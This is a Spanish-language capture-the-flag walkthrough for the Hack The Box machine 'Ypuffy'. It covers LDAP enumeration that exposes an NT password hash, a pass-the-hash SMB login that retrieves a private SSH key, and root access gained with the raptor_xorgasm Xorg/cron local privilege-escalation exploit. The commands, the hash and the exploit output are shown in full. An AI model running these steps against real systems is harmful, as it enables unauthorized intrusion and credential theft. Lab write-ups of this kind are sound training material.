A continuación se muestra la secuencia de pasos a seguir para obtener el root de este equipo, comenzando con la siguiente serie de códigos:

## Scan / Enumeración

```shell
$ nmap -A 10.10.10.107
```
Esto nos arroja el siguiente resultado: [nmap_a](nmap_a), allí notamos que hay un puerto abierto (`389 - ldap`), así que en este caso podemos proceder a su enumeración.

Para realizar la enumeración LDAP, se comienza por recolectar más información sobre el servicio, solicitando la siguiente consulta:

```shell
$ nmap -p 389 --script ldap-search 10.10.10.107 -oN nmap_ldap
```

> La respuesta fue almacenada en este archivo [nmap_ldap](nmap_ldap)

```shell
|     dn: ou=group,dc=hackthebox,dc=htb
|         ou: group
|         objectClass: top
|         objectClass: organizationalUnit
```
En las líneas que mostramos anteriormente tenemos todo lo que necesitamos, pues con esta información se puede proceder a realizar la siguiente línea de comando:

```shell
$ ldapsearch "objectclass=*" -h ypuffy.hackthebox.htb -b "ou=group,dc=hackthebox,dc=htb" -x > ldapsearch
```
> La respuesta fue almacenada en este archivo [ldapsearch](ldapsearch)

Una vez almacenada, notamos que no nos ofrece información adicional, por lo que tomamos los datos que nos interesan para analizar qué se puede hacer en este caso. Evaluando el archivo [nmap_ldap](nmap_ldap), vemos que el perfil de Alice tiene más información que el resto:

>uid: alice1978
>
>displayName: Alice
>
>dn: uid=alice1978,ou=passwd,dc=hackthebox,dc=htb
>
>sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B

Con esta información es más que suficiente para intentar un ataque PTH (***Pass The Hash***). 

Para ello armamos y enviamos la siguiente línea de comandos:

> pth-smbclient --user=[`UID`] --pw-nt-hash -I [`IP`] \\\\[`Dominio`]\\[`displayName`] [`Hash - sambaNTPassword`]

```shell
$ pth-smbclient --user=alice1978 --pw-nt-hash -I 10.10.10.107 \\\\10.10.10.107\\alice 0B186E661BBDBDCF6047784DE8B9FD8B

Unable to initialize messaging context
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jul 30 22:54:20 2018
  ..                                  D        0  Tue Feb  5 11:36:47 2019
  my_private_key.ppk                  A     1460  Mon Jul 16 21:38:51 2018

		433262 blocks of size 1024. 411532 blocks available
```

¡Bingo! De esta forma nos hemos conectado y al listar el directorio vemos que hay un archivo con extensión **.PPK**, así que nos salimos del ***smbclient*** para hacer la descarga de archivo.

Es importante tener en cuenta que los archivos creados por PuTTYgen se conocen como archivos de PPK, ellos se utilizan para permitir una comunicación segura con otra parte que tenga la clave pública correspondiente. Los archivos PPK contienen información acerca de la autenticación de clave que es el motivo por el que suelen servir como marcador del equipo, y que podría permitir el reconocimiento y utilización de dichos archivos.

Para descargarlo ejecutamos el comando anterior con un extra:

```shell
$ pth-smbclient --user=alice1978 --pw-nt-hash -I 10.10.10.107 \\\\10.10.10.107\\alice 0B186E661BBDBDCF6047784DE8B9FD8B -c 'get my_private_key.ppk'

Unable to initialize messaging context
getting file \my_private_key.ppk of size 1460 as my_private_key.ppk (1.8 KiloBytes/sec) (average 1.8 KiloBytes/sec)
```

---

## Flag USER

En este momento el equipo usado para elaborar este CTF no cuenta con `PuTTY` así que vamos a instalarlo

```shell
$ sudo apt-get install -y putty
```

El siguiente paso es ejecutarlo y abrir nuestro putty:

```shell
$ putty
```

Al momento de abrir la ventana, podemos observar que en la sección de ***Connection > SSH > Auth*** es donde se cargará el archivo llamado `my_private_key.ppk`, y por su parte en la sección ***Connection > Data***, se va a colocar el nombre del usuario `alice1978` en la sección de **auto-login username**, para que en ***SESSION*** finalmente podamos colocar el IP, que en nuestro caso específico es `10.10.10.107`. Cumplido este proceso conectamos:

```shell
OpenBSD 6.3 (GENERIC) #100: Sat Mar 24 14:17:45 MDT 2018

Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug(1) utility to report bugs in the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and if a
known fix for it exists, include that as well.

ypuffy$
```

Al ingresar, comenzamos a listar de la siguiente forma:

```shell
ypuffy$ ls -lha
total 40
drwxr-x---  3 alice1978  alice1978   512B Jul 31  2018 .
drwxr-xr-x  5 root       wheel       512B Jul 30  2018 ..
-rw-r--r--  1 alice1978  alice1978    87B Mar 24  2018 .Xdefaults
-rw-r--r--  1 alice1978  alice1978   771B Mar 24  2018 .cshrc
-rw-r--r--  1 alice1978  alice1978   101B Mar 24  2018 .cvsrc
-rw-r--r--  1 alice1978  alice1978   359B Mar 24  2018 .login
-rw-r--r--  1 alice1978  alice1978   175B Mar 24  2018 .mailrc
-rw-r--r--  1 alice1978  alice1978   215B Mar 24  2018 .profile
-r--------  1 alice1978  alice1978    33B Jul 30  2018 user.txt
drwxr-x---  2 alice1978  alice1978   512B Jul 30  2018 windir
```

Y sí, nuevamente ¡Bingo! ya tenemos `USER`, solo nos queda ejecutar de la siguiente forma:

```shell
ypuffy$ cat user.txt
```
***Hemos conseguido el flag del USER***

---

## Flag ROOT

Para informarnos sobre las restricciones, el tipo de usuario y el sistema operativo se deben ejecutar los siguientes comandos:

```shell
ypuffy$ id
uid=5000(alice1978) gid=5000(alice1978) groups=5000(alice1978)
ypuffy$ uname -a
OpenBSD ypuffy.hackthebox.htb 6.3 GENERIC#100 amd64
ypuffy$ echo $SHELL
/bin/ksh
```

Al tener la versión del sistema operativo ya se puede deducir que existe una vulnerabilidad para la escalada de privilegios, así que hay que ponerse manos a la obra:

```shell
ypuffy$ touch shell.sh
ypuffy$ chmod +x shell.sh
ypuffy$ ./shell.sh

raptor_xorgasm - xorg-x11-server LPE via OpenBSD's cron
Copyright (c) 2018 Marco Ivaldi <raptor@0xdeadbeef.info>

Be patient for a couple of minutes...

Don't forget to cleanup and run crontab -e to reload the crontab.

-rw-r--r--  1 root  wheel  4813 Feb  5 14:48 /etc/crontab
-rwsrwxrwx  1 root  wheel  7257 Feb  5 14:51 /usr/local/bin/pwned
```

>En este archivo [shell.sh](shell) tendremos una copia del contenido del script ejecutado en el servidor para lograr la escalada de privilegios

Es importante verificar nuevamente las restricciones y el tipo de usuario con el fin de saber si se ha logrado escalar privilegios:

```shell
ypuffy# id
uid=0(root) gid=0(wheel) groups=5000(alice1978)
```

¡Listo! Hemos logrado root, ¡vamos por nuestra flag!:

```shell
ypuffy# cat /root/root.txt
```

***Hemos logrado conseguir el flag del ROOT***

---

### xTrate